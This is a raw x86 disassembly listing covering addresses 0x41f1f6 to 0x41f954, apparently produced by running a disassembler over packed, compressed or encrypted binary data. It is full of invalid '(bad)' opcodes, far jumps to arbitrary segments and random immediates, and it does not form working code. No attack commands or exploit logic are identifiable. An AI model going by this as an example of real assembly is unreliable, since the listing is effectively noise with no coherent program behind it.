  41f1f6:	mov    ah,0x65
  41f1f8:	xor    dl,BYTE PTR [edi+0x41]
  41f1fb:	cli    
  41f1fc:	cmp    DWORD PTR [edi-0x12],eax
  41f1ff:	xor    bl,BYTE PTR [eax]
  41f201:	aaa    
  41f202:	sbb    eax,0x5793353
  41f207:	jno    0x41f20a
  41f209:	pop    ds
  41f20a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20b:	fidiv  WORD PTR [eax-0x41e4350c]
  41f211:	fbstp  TBYTE PTR [eax-0x1]
  41f214:	inc    ebp
  41f215:	mov    ah,0x2a
  41f217:	push   edi
  41f218:	xchg   BYTE PTR [eax-0x5a],ah
  41f21b:	out    0xae,eax
  41f21d:	mov    DWORD PTR [ecx+eiz*4],esp
  41f220:	cld    
  41f221:	mov    esp,0x5a4445d2
  41f226:	dec    esi
  41f227:	jb     0x41f243
  41f229:	mov    ?,WORD PTR [ebp+0x3606ac66]
  41f22f:	xchg   ebp,eax
  41f230:	das    
  41f231:	jl     0x41f2a5
  41f233:	popf   
  41f234:	dec    eax
  41f235:	imul   ebp,DWORD PTR [esi+0x76],0xeb9c10c1
  41f23c:	xchg   esp,eax
  41f23d:	(bad)  
  41f23e:	aas    
  41f23f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f241:	dec    esi
  41f242:	scas   eax,DWORD PTR es:[edi]
  41f243:	inc    edi
  41f244:	pop    DWORD PTR [eax-0x26a6210b]
  41f24a:	xchg   ebx,eax
  41f24b:	outs   dx,BYTE PTR ds:[esi]
  41f24c:	loopne 0x41f1f1
  41f24e:	sub    al,0x6b
  41f250:	mov    DWORD PTR [ebx-0x79],ebp
  41f253:	jle    0x41f23f
  41f255:	jmp    0x36646fb5
  41f25a:	add    BYTE PTR [edx+0x56],bh
  41f25d:	jp     0x775c5f08
  41f263:	das    
  41f264:	das    
  41f265:	cmp    eax,DWORD PTR [edi+0x44]
  41f268:	(bad)  
  41f269:	stos   DWORD PTR es:[edi],eax
  41f26a:	xlat   BYTE PTR ds:[ebx]
  41f26b:	xchg   edx,eax
  41f26c:	retf   
  41f26d:	aam    0x54
  41f26f:	xor    BYTE PTR [ebp-0x76],al
  41f272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f273:	dec    ecx
  41f274:	ds icebp 
  41f276:	fnstcw WORD PTR [eax]
  41f278:	test   cl,al
  41f27a:	sbb    ch,ah
  41f27c:	jp     0x41f2b9
  41f27e:	or     BYTE PTR [edx],al
  41f280:	call   0x3d4f:0x853419f4
  41f287:	retf   0x651b
  41f28a:	mov    esp,0x39b38766
  41f28f:	cwde   
  41f290:	xor    eax,DWORD PTR [ebx+0x5e]
  41f293:	pop    ebp
  41f294:	mov    ebx,cs
  41f296:	ret    0x99b
  41f299:	sti    
  41f29a:	(bad)  
  41f29b:	mov    BYTE PTR [ebx+edi*2+0x1e],bh
  41f29f:	and    al,0x30
  41f2a1:	(bad)  
  41f2a2:	sbb    eax,0x74ccf17b
  41f2a7:	ret    0xddfe
  41f2aa:	or     DWORD PTR [esi-0x59],eax
  41f2ad:	push   0xffffffe0
  41f2af:	test   al,0x17
  41f2b1:	lods   al,BYTE PTR ds:[esi]
  41f2b2:	popa   
  41f2b3:	push   ecx
  41f2b4:	push   0x70c434e3
  41f2b9:	cwde   
  41f2ba:	add    ah,BYTE PTR [edi]
  41f2bc:	loope  0x41f257
  41f2be:	jl     0x41f24a
  41f2c0:	pop    ecx
  41f2c1:	int    0xa0
  41f2c3:	imul   ecx,edx,0x83ef8b82
  41f2c9:	ins    DWORD PTR es:[edi],dx
  41f2ca:	mov    bl,0x9e
  41f2cc:	adc    BYTE PTR [eax-0x65caaf9b],bl
  41f2d2:	xor    DWORD PTR [esi],0xebe2b2ea
  41f2d8:	mov    bl,0xda
  41f2da:	pop    ebx
  41f2db:	nop
  41f2dc:	push   0x661a22e0
  41f2e1:	ret    
  41f2e2:	mov    dh,0x62
  41f2e4:	popa   
  41f2e5:	fisttp DWORD PTR [ebp+0x70]
  41f2e8:	rcr    DWORD PTR [ebx],cl
  41f2ea:	lahf   
  41f2eb:	mov    ah,0x62
  41f2ed:	out    dx,al
  41f2ee:	adc    ah,BYTE PTR [esi]
  41f2f0:	sahf   
  41f2f1:	popa   
  41f2f2:	cld    
  41f2f3:	jmp    0x3095:0x793185c8
  41f2fa:	test   BYTE PTR [ecx-0x2acf898a],ch
  41f300:	in     al,dx
  41f301:	xor    ebp,ecx
  41f303:	pop    edx
  41f304:	rcr    BYTE PTR [ecx],cl
  41f306:	fist   DWORD PTR [eax+ebx*8]
  41f309:	in     eax,dx
  41f30a:	rcr    BYTE PTR [edx-0x643af16b],0x7f
  41f311:	mov    bh,0xe2
  41f313:	xlat   BYTE PTR ds:[ebx]
  41f314:	and    BYTE PTR [ebp-0x3e0ce939],0x23
  41f31b:	sub    ebx,DWORD PTR [esi]
  41f31d:	xchg   ebp,ebp
  41f31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f320:	or     BYTE PTR [ecx+0x1769d42f],al
  41f326:	xor    esi,DWORD PTR [edi]
  41f328:	inc    ecx
  41f329:	inc    ecx
  41f32a:	(bad)  
  41f32b:	xchg   ebp,eax
  41f32c:	cmp    BYTE PTR [ebx],ch
  41f32e:	sbb    eax,0x833793ee
  41f333:	sub    eax,DWORD PTR [eax+0x4e4f9233]
  41f339:	mov    dl,0x4b
  41f33b:	shr    DWORD PTR [ecx+0x2445fd76],0xc7
  41f342:	ss cmp eax,0x66f15e6b
  41f348:	mov    al,ds:0xd6593b7c
  41f34d:	adc    al,0x41
  41f34f:	scas   al,BYTE PTR es:[edi]
  41f350:	outs   dx,BYTE PTR ds:[esi]
  41f351:	adc    ch,BYTE PTR fs:[eax-0x54]
  41f355:	(bad)  
  41f356:	jg     0x41f389
  41f358:	mov    ebx,0x39618c9f
  41f35d:	test   DWORD PTR [eax+0x259a9a9d],0x47bdbf2f
  41f367:	repnz mov ds:0xbb54f77e,al
  41f36d:	out    dx,al
  41f36e:	push   cs
  41f36f:	cmp    al,0xaf
  41f371:	fld    st(0)
  41f373:	addps  xmm3,XMMWORD PTR [esi]
  41f376:	push   edi
  41f377:	mov    ah,0x5a
  41f379:	sub    eax,0x4b8e9871
  41f37e:	sbb    eax,0x6ee54f52
  41f383:	inc    esi
  41f384:	xchg   esi,eax
  41f385:	stos   BYTE PTR es:[edi],al
  41f386:	mov    ds:0xaa2e3963,al
  41f38b:	pop    ecx
  41f38c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f38d:	dec    esp
  41f38e:	retf   0x9f9
  41f391:	pop    eax
  41f392:	xor    eax,0xf8b493ac
  41f397:	rcr    ch,1
  41f399:	mov    fs,WORD PTR [eax+ecx*1]
  41f39c:	aam    0xcd
  41f39e:	int    0xba
  41f3a0:	push   ecx
  41f3a1:	scas   al,BYTE PTR es:[edi]
  41f3a2:	xor    al,bh
  41f3a4:	push   cs
  41f3a5:	pop    es
  41f3a6:	mov    bh,0xd2
  41f3a8:	cmp    DWORD PTR [ebp+0xb],0xb7a8bb4d
  41f3af:	sub    edx,DWORD PTR [ebx]
  41f3b1:	mov    dh,0x1
  41f3b3:	cdq    
  41f3b4:	leave  
  41f3b5:	in     al,0x8f
  41f3b7:	or     bh,ch
  41f3b9:	adc    ebx,esp
  41f3bb:	push   ebx
  41f3bc:	xchg   ebx,eax
  41f3bd:	ret    
  41f3be:	or     eax,0xc28956c8
  41f3c3:	cmp    cl,BYTE PTR [edi]
  41f3c5:	or     BYTE PTR [esp+edx*2+0x58],ah
  41f3c9:	repz cmp dl,cl
  41f3cc:	xor    DWORD PTR [eax-0x17],esp
  41f3cf:	push   ebx
  41f3d0:	cs aam 0x6c
  41f3d3:	retf   
  41f3d4:	icebp  
  41f3d5:	inc    ebx
  41f3d6:	rcl    BYTE PTR [ebx+0x18],0x65
  41f3da:	sbb    BYTE PTR [ebx-0x4],dl
  41f3dd:	xor    cl,al
  41f3df:	pusha  
  41f3e0:	push   esi
  41f3e1:	mov    dh,0xa4
  41f3e3:	jmp    0xe57b:0xec85c75f
  41f3ea:	jge    0x41f393
  41f3ec:	and    edx,DWORD PTR [eax+0x54c47497]
  41f3f2:	and    eax,0x2f1ca947
  41f3f7:	aaa    
  41f3f8:	clc    
  41f3f9:	lods   al,BYTE PTR ds:[esi]
  41f3fa:	cmovle edx,DWORD PTR [esi]
  41f3fd:	bound  ebx,QWORD PTR [esi-0x40a6fb22]
  41f403:	ret    0xec29
  41f406:	mov    ebx,0x82ff5565
  41f40b:	pop    es
  41f40c:	mov    ds:0x7bf6d837,eax
  41f411:	mov    al,ds:0x509f3554
  41f416:	mov    ds:0x72706f16,al
  41f41b:	fsub   QWORD PTR [ecx+eiz*1]
  41f41e:	add    ah,BYTE PTR [ecx+0x11]
  41f421:	push   ebp
  41f422:	jns    0x41f3c1
  41f424:	iret   
  41f425:	sub    esp,ebp
  41f427:	cmp    al,0x5d
  41f429:	fistp  QWORD PTR [edi-0x30]
  41f42c:	jg     0x41f453
  41f42e:	jbe    0x41f4aa
  41f430:	lock mov DWORD PTR [ebp+0x77cc0b28],edx
  41f437:	xchg   ecx,eax
  41f438:	inc    ebp
  41f439:	pop    esp
  41f43a:	cld    
  41f43b:	rcr    DWORD PTR [eax-0x45],1
  41f43e:	pop    edi
  41f43f:	mov    ss,WORD PTR [esi]
  41f441:	iret   
  41f442:	inc    edi
  41f443:	add    BYTE PTR [eax],al
  41f445:	add    BYTE PTR [eax],al
  41f447:	add    BYTE PTR [eax],al
  41f449:	add    BYTE PTR [edx+0x4d],dl
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	rcr    BYTE PTR [edi-0x7c2e19ef],0x1
  41f45d:	add    BYTE PTR [ecx+0x77000006],al
  41f463:	cmp    DWORD PTR [eax+0x2bae64f2],edi
  41f469:	out    0x40,al
  41f46b:	leave  
  41f46c:	popa   
  41f46d:	es pop edx
  41f46f:	mov    ds:0xff97b26b,al
  41f474:	cdq    
  41f475:	or     eax,0xcfa156a2
  41f47a:	sbb    eax,0x56ec411
  41f47f:	cwde   
  41f480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f481:	dec    esp
  41f482:	pop    es
  41f483:	push   esp
  41f484:	xor    al,0x55
  41f486:	fs (bad) 
  41f488:	jne    0x41f4c9
  41f48a:	xor    al,0xf9
  41f48c:	call   0x454:0x5bd7279c
  41f493:	inc    ebp
  41f494:	sbb    al,0xfe
  41f496:	inc    esp
  41f497:	add    BYTE PTR [esi-0xefdb336],0x58
  41f49e:	iret   
  41f49f:	inc    edi
  41f4a0:	mov    eax,ds:0x3c7df785
  41f4a5:	inc    edi
  41f4a6:	test   DWORD PTR gs:[edx-0x377d142e],0xa4592848
  41f4b1:	arpl   WORD PTR [edx+0x6f41a970],sp
  41f4b7:	add    BYTE PTR [edx-0x2693964],bh
  41f4bd:	sub    al,0xff
  41f4bf:	inc    ebp
  41f4c0:	(bad)  
  41f4c1:	xor    al,0x99
  41f4c3:	xchg   edi,eax
  41f4c4:	lock pop ebp
  41f4c6:	inc    esi
  41f4c7:	in     al,dx
  41f4c8:	jb     0x41f51b
  41f4ca:	jge    0x41f45a
  41f4cc:	jle    0x41f48a
  41f4ce:	mov    ss,esp
  41f4d0:	test   eax,0xf2d6ae5d
  41f4d5:	(bad)  
  41f4d6:	jne    0x41f48b
  41f4d8:	arpl   WORD PTR [edi],di
  41f4da:	push   edx
  41f4db:	pushf  
  41f4dc:	mov    ecx,0xb27077d9
  41f4e1:	add    esi,DWORD PTR ds:0xb290851a
  41f4e7:	in     eax,0x35
  41f4e9:	daa    
  41f4ea:	push   ss
  41f4eb:	repz loope 0x41f512
  41f4ee:	stos   DWORD PTR es:[edi],eax
  41f4ef:	rol    DWORD PTR [edx],cl
  41f4f1:	inc    edi
  41f4f2:	pop    esp
  41f4f3:	jmp    0xcb2:0x5f0c497c
  41f4fa:	fdivr  st(3),st
  41f4fc:	xor    eax,0x17c218e4
  41f501:	xor    edx,DWORD PTR [edi+0x23]
  41f504:	sbb    BYTE PTR [ebp-0x6],ch
  41f507:	adc    eax,0xfaa807c9
  41f50c:	xchg   BYTE PTR [edx],cl
  41f50e:	push   edx
  41f50f:	push   ss
  41f510:	mov    WORD PTR [edx+0x31f494c7],fs
  41f516:	mov    eax,0x3f6c3d82
  41f51b:	test   BYTE PTR [esi+0x3bf7eeff],0x80
  41f522:	dec    ebx
  41f523:	mov    eax,ds:0x51b0dc5d
  41f528:	inc    esi
  41f529:	xor    al,0xdd
  41f52b:	ss or  eax,0x232becf3
  41f531:	ficom  WORD PTR [edx]
  41f533:	sub    eax,0xf5da448c
  41f538:	or     DWORD PTR [eax+0x6eb345ab],esp
  41f53e:	jmp    0x41f557
  41f540:	mov    edi,0xf41afc24
  41f545:	call   0xc1b13d54
  41f54a:	xchg   esi,eax
  41f54b:	xor    al,0xcf
  41f54d:	mov    dl,0x9
  41f54f:	xchg   DWORD PTR [eax-0x29051a42],ebp
  41f555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f556:	xlat   BYTE PTR ds:[ebx]
  41f557:	test   DWORD PTR ds:0x2e4ca356,esp
  41f55d:	mov    al,0x6e
  41f55f:	add    BYTE PTR [edx+0x13],bh
  41f562:	pop    ebx
  41f563:	inc    esi
  41f564:	dec    eax
  41f565:	sbb    bh,BYTE PTR [eax+0x20]
  41f568:	push   ss
  41f569:	dec    edi
  41f56a:	sbb    DWORD PTR ds:0xe904efa1,0x59
  41f571:	scas   al,BYTE PTR es:[edi]
  41f572:	adc    eax,0xb39ceb58
  41f577:	sub    cl,BYTE PTR [eax]
  41f579:	mov    eax,ds:0x597589e4
  41f57e:	rcr    BYTE PTR [edx-0x2b],1
  41f581:	test   al,0xe1
  41f583:	xor    esi,0xf34fd7d1
  41f589:	push   ecx
  41f58a:	add    eax,0x4d913ff4
  41f58f:	loope  0x41f5bc
  41f591:	adc    ebx,DWORD PTR [ebx+0x5c]
  41f594:	push   ds
  41f595:	sbb    DWORD PTR [edi+0x4e8bdd23],0xffffffb4
  41f59c:	dec    ecx
  41f59d:	popa   
  41f59e:	cwde   
  41f59f:	or     BYTE PTR [ecx-0x2655fe5c],0xcd
  41f5a6:	test   eax,0x58b16154
  41f5ab:	jecxz  0x41f619
  41f5ad:	ds inc edx
  41f5af:	jg     0x41f53b
  41f5b1:	push   esi
  41f5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b3:	(bad)  [edx+0x23]
  41f5b6:	hlt    
  41f5b7:	cli    
  41f5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b9:	add    BYTE PTR [edx],dh
  41f5bb:	push   es
  41f5bc:	dec    ebp
  41f5bd:	push   ebx
  41f5be:	xchg   edi,eax
  41f5bf:	dec    esi
  41f5c0:	mov    ebp,DWORD PTR [edi-0x5f]
  41f5c3:	add    al,0xa7
  41f5c5:	loope  0x41f5c5
  41f5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5c8:	fst    st(2)
  41f5ca:	cmp    al,BYTE PTR [edi+0x10]
  41f5cd:	shl    BYTE PTR [ebx-0x6],0x94
  41f5d1:	fsub   st,st(7)
  41f5d3:	cwde   
  41f5d4:	mov    edi,0x8a5bd856
  41f5d9:	mov    esi,0x935daf7a
  41f5de:	add    al,0x64
  41f5e0:	and    dh,ch
  41f5e2:	push   ebp
  41f5e3:	cli    
  41f5e4:	pushf  
  41f5e5:	inc    esp
  41f5e6:	clc    
  41f5e7:	mov    ds:0x4c82ab5a,eax
  41f5ec:	daa    
  41f5ed:	fs mov bh,0xce
  41f5f0:	xchg   esp,eax
  41f5f1:	sub    ebx,DWORD PTR [ecx+edi*4+0x4c798e0a]
  41f5f8:	pop    ecx
  41f5f9:	inc    esi
  41f5fa:	ss cmc 
  41f5fc:	xchg   ecx,eax
  41f5fd:	or     BYTE PTR [esi],al
  41f5ff:	sbb    esi,DWORD PTR [ecx]
  41f601:	test   eax,0x3b5934ea
  41f606:	sub    bl,BYTE PTR [ecx]
  41f608:	(bad)  
  41f609:	mov    eax,0xd13d24d5
  41f60e:	jnp    0x41f66f
  41f610:	ss xor eax,0x57dc66b1
  41f616:	jns    0x41f604
  41f618:	push   edx
  41f619:	adc    dl,BYTE PTR [edx+0x4c]
  41f61c:	add    DWORD PTR [esi+0x12],edi
  41f61f:	and    BYTE PTR [ebx+0x347a729d],cl
  41f625:	enter  0xc7f5,0xc5
  41f629:	sub    al,0xd7
  41f62b:	add    eax,0xcab34d21
  41f630:	outs   dx,BYTE PTR ds:[esi]
  41f631:	sub    DWORD PTR [ecx-0x4dca89eb],0x72
  41f638:	pop    ecx
  41f639:	aam    0x49
  41f63b:	test   eax,0xb2fc2c70
  41f640:	jnp    0x41f5f5
  41f642:	add    eax,0x168609cf
  41f647:	sbb    edx,edi
  41f649:	fdivr  QWORD PTR [edx-0x7d3abe1b]
  41f64f:	pop    ss
  41f650:	inc    ecx
  41f651:	(bad)  
  41f652:	jmp    0x3ba300a
  41f657:	(bad)  
  41f658:	mov    esp,DWORD PTR [eax+0x23]
  41f65b:	or     bl,BYTE PTR [eax-0x6f]
  41f65e:	xor    eax,0xcd1a22a1
  41f663:	and    esi,DWORD PTR [esi+ebx*1+0x55]
  41f667:	sbb    eax,0x12f2733f
  41f66c:	jno    0x41f64a
  41f66e:	adc    BYTE PTR [eax+0x4],0x7
  41f672:	sbb    bh,BYTE PTR [ecx+0x3e]
  41f675:	daa    
  41f676:	xchg   DWORD PTR [ecx],edx
  41f678:	cmp    BYTE PTR ds:0x703f4092,bl
  41f67e:	scas   eax,DWORD PTR es:[edi]
  41f67f:	or     eax,0x490a977c
  41f684:	mov    bh,0x54
  41f686:	(bad)  
  41f687:	or     edx,DWORD PTR [ecx+esi*2+0x178a16c0]
  41f68e:	xchg   DWORD PTR [esi-0x14],eax
  41f691:	and    ebx,DWORD PTR [edx+0x44]
  41f694:	enter  0x8409,0xf0
  41f698:	cmp    DWORD PTR [esi-0x3d068b97],ebp
  41f69e:	pop    ecx
  41f69f:	lahf   
  41f6a0:	dec    edi
  41f6a1:	popa   
  41f6a2:	sbb    eax,DWORD PTR [ebx]
  41f6a4:	lods   eax,DWORD PTR ds:[esi]
  41f6a5:	dec    esi
  41f6a6:	xor    esp,0xd
  41f6a9:	inc    esp
  41f6aa:	jmp    0xe59a174f
  41f6af:	and    DWORD PTR [ecx-0x8634bf4],esp
  41f6b5:	repnz imul edi,DWORD PTR [eax+0x52],0x16
  41f6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6bb:	out    0xde,eax
  41f6bd:	push   edi
  41f6be:	les    ebp,FWORD PTR [eax-0x57]
  41f6c1:	xchg   edx,eax
  41f6c2:	jmp    0xe3018b86
  41f6c7:	mov    esi,0x83975735
  41f6cc:	pop    eax
  41f6cd:	pop    edi
  41f6ce:	outs   dx,BYTE PTR ds:[esi]
  41f6cf:	pop    ebp
  41f6d0:	fdiv   DWORD PTR [ebx]
  41f6d2:	pushf  
  41f6d3:	cwde   
  41f6d4:	sahf   
  41f6d5:	iret   
  41f6d6:	pop    esi
  41f6d7:	std    
  41f6d8:	mov    gs,WORD PTR [esi-0x77]
  41f6db:	sbb    BYTE PTR gs:[edi],al
  41f6de:	sub    cl,BYTE PTR [eax-0x5deb55e2]
  41f6e4:	int    0x7a
  41f6e6:	stc    
  41f6e7:	dec    ebp
  41f6e8:	xchg   ecx,eax
  41f6e9:	mov    esi,0x2085784b
  41f6ee:	pop    edx
  41f6ef:	fstp   DWORD PTR [ebp+0x2d]
  41f6f2:	cmp    eax,0x7d4ffbca
  41f6f7:	jne    0x41f679
  41f6f9:	add    DWORD PTR [ecx-0x2639b408],0xf8322360
  41f703:	mov    ch,0x86
  41f705:	or     edx,esp
  41f707:	push   ecx
  41f708:	int    0x74
  41f70a:	jne    0x41f77c
  41f70c:	jecxz  0x41f75a
  41f70e:	jns    0x41f765
  41f710:	retf   
  41f711:	and    dl,BYTE PTR [esi]
  41f713:	jbe    0x41f6c2
  41f715:	inc    esp
  41f716:	pop    ecx
  41f717:	sar    BYTE PTR [eax+edi*4-0x7328d54],cl
  41f71e:	test   BYTE PTR [edx-0x30],ch
  41f721:	fild   QWORD PTR [edi-0x27b0e549]
  41f727:	or     eax,0x9f438db8
  41f72c:	pop    edx
  41f72d:	(bad)  
  41f72e:	(bad)  
  41f730:	xor    DWORD PTR [edi-0x47],esi
  41f733:	les    eax,FWORD PTR [edi+0x7e]
  41f736:	ins    DWORD PTR es:[edi],dx
  41f737:	mov    ds:0x188dab16,al
  41f73c:	sub    eax,0x6069476d
  41f741:	pop    esp
  41f742:	add    DWORD PTR [edx+0x4f7f3ada],eax
  41f748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f749:	pop    ecx
  41f74a:	xor    edx,DWORD PTR [edi-0x275ffdff]
  41f750:	cmp    al,BYTE PTR [ecx+eiz*2+0x9]
  41f754:	and    BYTE PTR [esp+ecx*2+0x4ff8ac0c],cl
  41f75b:	mov    ?,esi
  41f75d:	pop    ss
  41f75e:	ret    0x9eb9
  41f761:	push   edx
  41f762:	ret    0x8426
  41f765:	xchg   ecx,eax
  41f766:	jne    0x41f751
  41f768:	push   esi
  41f769:	mov    eax,ds:0x789d70f2
  41f76e:	rcl    ebx,1
  41f770:	jns    0x41f730
  41f772:	popa   
  41f773:	inc    esi
  41f774:	xchg   ebp,eax
  41f775:	pop    ds
  41f776:	jmp    0x5578:0x7f25880a
  41f77d:	inc    esp
  41f77e:	adc    esi,DWORD PTR [ebx]
  41f780:	scas   eax,DWORD PTR es:[edi]
  41f781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f782:	loop   0x41f78c
  41f784:	mov    WORD PTR [eax+0x75],fs
  41f787:	mov    ch,0x5b
  41f789:	out    dx,al
  41f78a:	xor    ecx,ebp
  41f78c:	scas   eax,DWORD PTR es:[edi]
  41f78d:	xor    DWORD PTR [ebp-0x2a],esi
  41f790:	jae    0x41f743
  41f792:	add    eax,0x228728b8
  41f797:	ret    0x65db
  41f79a:	rcr    BYTE PTR [edx],1
  41f79c:	xor    al,0xf9
  41f79e:	push   esi
  41f79f:	(bad)  
  41f7a0:	es out 0xbf,eax
  41f7a3:	sbb    ah,0x4c
  41f7a6:	inc    edx
  41f7a7:	inc    esp
  41f7a8:	das    
  41f7a9:	push   ds
  41f7aa:	adc    eax,0x44647684
  41f7af:	pop    esp
  41f7b0:	xor    esp,DWORD PTR [edi-0x11cbe26a]
  41f7b6:	push   ebx
  41f7b7:	cdq    
  41f7b8:	ins    BYTE PTR es:[edi],dx
  41f7b9:	and    eax,0x5e043969
  41f7be:	cwde   
  41f7bf:	hlt    
  41f7c0:	(bad)  
  41f7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7c2:	les    edx,FWORD PTR [eax+0x76]
  41f7c5:	nop
  41f7c6:	aaa    
  41f7c7:	add    eax,0x91f8967c
  41f7cc:	mov    eax,ds:0xd0321be9
  41f7d1:	iret   
  41f7d2:	inc    ebp
  41f7d3:	iret   
  41f7d4:	rcl    BYTE PTR [ecx+0x11],1
  41f7d7:	push   ds
  41f7d8:	sbb    eax,0x56a8fbf2
  41f7dd:	and    esp,edx
  41f7df:	ins    BYTE PTR es:[edi],dx
  41f7e0:	mov    WORD PTR [esi-0x56e0c297],fs
  41f7e6:	icebp  
  41f7e7:	mov    al,ds:0xeb89b0d2
  41f7ec:	inc    ebx
  41f7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ee:	test   DWORD PTR [edx+0x301dcc2],edx
  41f7f4:	stc    
  41f7f5:	stos   BYTE PTR es:[edi],al
  41f7f6:	mov    al,0xad
  41f7f8:	push   0x18
  41f7fa:	add    ebx,edi
  41f7fc:	scas   eax,DWORD PTR es:[edi]
  41f7fd:	inc    esp
  41f7fe:	mov    ebx,0xe01e6c0a
  41f803:	scas   eax,DWORD PTR es:[edi]
  41f804:	push   edi
  41f805:	fld    DWORD PTR [eax]
  41f807:	xchg   esp,eax
  41f808:	in     eax,dx
  41f809:	shl    al,0x0
  41f80c:	pop    ebp
  41f80d:	mov    edi,0xb45cbf0a
  41f812:	inc    edx
  41f813:	mov    al,0x28
  41f815:	int3   
  41f816:	out    0xa0,al
  41f818:	aas    
  41f819:	mov    al,ds:0xa9c0c61
  41f81e:	pop    es
  41f81f:	mov    bh,0x3d
  41f821:	stos   BYTE PTR es:[edi],al
  41f822:	xchg   ebp,eax
  41f824:	pop    edx
  41f825:	and    al,0x1e
  41f827:	push   edx
  41f828:	hlt    
  41f829:	test   al,0xb6
  41f82b:	jnp    0x41f7b3
  41f82d:	cmp    BYTE PTR [ecx-0x59],bh
  41f830:	fwait
  41f831:	daa    
  41f832:	fbstp  TBYTE PTR [ebp-0x30]
  41f835:	test   BYTE PTR [edx],ah
  41f837:	ins    BYTE PTR es:[edi],dx
  41f838:	mov    esi,0x93949bd4
  41f83d:	mov    ebx,DWORD PTR [esi+edx*2+0x16efe9d4]
  41f844:	jbe    0x41f889
  41f846:	mov    cl,bl
  41f848:	pop    ebp
  41f849:	or     eax,0xeb1152ff
  41f84e:	dec    edx
  41f84f:	mov    dl,0x60
  41f851:	push   ds
  41f852:	xchg   edi,eax
  41f853:	jno    0x41f87e
  41f855:	clc    
  41f856:	das    
  41f857:	jno    0x41f82a
  41f859:	cmp    ch,0x60
  41f85c:	inc    esp
  41f85d:	pop    esp
  41f85e:	loopne 0x41f832
  41f860:	cmp    eax,0xf61ef2d0
  41f865:	cmp    ah,dh
  41f867:	(bad)  
  41f868:	test   al,0x55
  41f86a:	popf   
  41f86b:	call   0x452b8ae8
  41f870:	xor    edi,esp
  41f872:	push   edx
  41f873:	push   ss
  41f874:	jmp    0x5631b621
  41f879:	xchg   edi,eax
  41f87a:	stos   DWORD PTR es:[edi],eax
  41f87b:	rol    DWORD PTR [ebp+0x3972f3f3],0xbe
  41f882:	fs jle 0x41f8a8
  41f885:	stos   BYTE PTR es:[edi],al
  41f886:	sub    BYTE PTR [ebp+0x79f2e072],dl
  41f88c:	add    eax,0x718c02b2
  41f891:	mov    dl,0x23
  41f893:	cdq    
  41f894:	sub    ebp,DWORD PTR ds:0x97af432e
  41f89a:	mov    bl,0x94
  41f89c:	xor    DWORD PTR [ebx],ecx
  41f89e:	test   bh,ah
  41f8a0:	pusha  
  41f8a1:	jnp    0x41f86e
  41f8a3:	xor    BYTE PTR [ecx],dl
  41f8a5:	jecxz  0x41f841
  41f8a7:	pop    ebx
  41f8a8:	pop    ss
  41f8a9:	(bad)  
  41f8aa:	mov    BYTE PTR [edx],bl
  41f8ac:	fldlg2 
  41f8ae:	jo     0x41f874
  41f8b0:	popa   
  41f8b1:	xor    DWORD PTR [edx],0xffffffdb
  41f8b4:	cmp    BYTE PTR ds:0x23e44415,0x66
  41f8bb:	scas   eax,DWORD PTR es:[edi]
  41f8bc:	fsubr  QWORD PTR [esp+edi*8+0x49]
  41f8c0:	jg     0x41f93b
  41f8c2:	arpl   WORD PTR [ebx-0x1daf9c5c],bp
  41f8c8:	mov    DWORD PTR [ecx],eax
  41f8ca:	cs int3 
  41f8cc:	lods   al,BYTE PTR ds:[esi]
  41f8cd:	jmp    0x458bbaec
  41f8d2:	dec    ebp
  41f8d3:	cwde   
  41f8d4:	jle    0x41f914
  41f8d6:	cmp    esi,ecx
  41f8d8:	rol    DWORD PTR [ebp-0x3bfcfac1],1
  41f8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8df:	scas   al,BYTE PTR es:[edi]
  41f8e0:	fistp  QWORD PTR [edi]
  41f8e2:	add    al,BYTE PTR [edx-0x69]
  41f8e5:	pop    edx
  41f8e6:	or     ah,BYTE PTR [eax+0x2a]
  41f8e9:	dec    ecx
  41f8ea:	adc    dl,dh
  41f8ec:	mov    ds:0xb1c122d0,eax
  41f8f1:	int3   
  41f8f2:	jl     0x41f8ce
  41f8f4:	inc    ebp
  41f8f5:	push   ebp
  41f8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f7:	and    cl,BYTE PTR [ebp+0x464e1fd9]
  41f8fd:	xor    BYTE PTR [ebx+0x57],bl
  41f900:	arpl   WORD PTR [ecx+0x5b],di
  41f903:	dec    ebp
  41f904:	cs in  eax,dx
  41f906:	push   cs
  41f907:	mov    DWORD PTR [eax+0x220cc5ca],edi
  41f90d:	sbb    eax,0xe29241ad
  41f912:	or     eax,0xe0e011ad
  41f917:	out    0xd9,eax
  41f919:	fsubrp st(1),st
  41f91b:	push   esi
  41f91c:	lock cmp BYTE PTR [eax+0x696a0d2b],al
  41f923:	mov    esp,0x8d0d5e3a
  41f928:	adc    DWORD PTR [ecx],ebx
  41f92a:	dec    esp
  41f92b:	mov    eax,ds:0x47a3c089
  41f930:	mov    DWORD PTR [edi-0x9b7cf67],eax
  41f936:	xor    esi,DWORD PTR [edx-0x3fa475af]
  41f93c:	cwde   
  41f93d:	sub    bl,BYTE PTR [ebx-0x36]
  41f940:	outs   dx,DWORD PTR ds:[esi]
  41f941:	jno    0x41f9bf
  41f943:	test   al,0x87
  41f945:	xor    al,0x3d
  41f947:	in     al,0xde
  41f949:	mov    eax,0xf13a4963
  41f94e:	dec    esp
  41f94f:	or     BYTE PTR [edx+ebx*4+0x45],0x24
  41f954:	dec    ecx
